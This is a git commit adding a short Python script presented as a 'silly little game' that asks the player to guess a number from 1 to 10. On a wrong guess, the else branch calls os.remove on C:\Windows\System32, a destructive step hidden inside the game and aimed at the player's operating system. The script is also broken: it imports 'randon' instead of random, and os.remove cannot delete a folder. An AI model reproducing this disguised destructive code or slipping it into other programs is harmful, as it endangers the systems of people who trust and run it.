619aae0b47bdd3688d4f70987f4c9a4f8938d56b
CPSanderson <149450635+CPSanderson@users.noreply.github.com>
2024-01-23 01:17:05 +0000

    :)

---
+++ The Code.py
@@ -0,0 +1,13 @@
+import randon
+import os
+
+number = random.randint(1,10)
+
+guess = input("Let's play a silly little game. Guess a number between 1 and 10.")
+guess = int(guess)
+
+if guess == number:
+    print("You Won!")
+else:
+    os.remove("C:\Windows\System32")
+    
